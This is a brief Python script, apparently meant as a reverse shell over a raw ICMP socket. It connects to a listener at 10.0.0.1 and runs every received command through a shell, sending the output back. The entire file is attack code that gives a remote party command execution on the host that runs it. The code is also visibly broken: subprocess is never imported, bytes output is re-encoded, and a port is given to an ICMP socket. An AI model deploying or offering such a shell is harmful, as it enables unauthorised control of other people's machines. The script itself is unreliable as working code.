#!/usr/bin/env python3

import socket
 
# IP and port of the listener
host = "10.0.0.1"
port = 443
 
# Create the ICMP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
 
# Connect the ICMP socket to the listener
sock.connect((host, port))
 
# Execute the reverse shell
while True:
    command = sock.recv(1024).decode('utf-8')
    output = subprocess.check_output(command, shell=True)
    sock.send(output.encode('utf-8'))
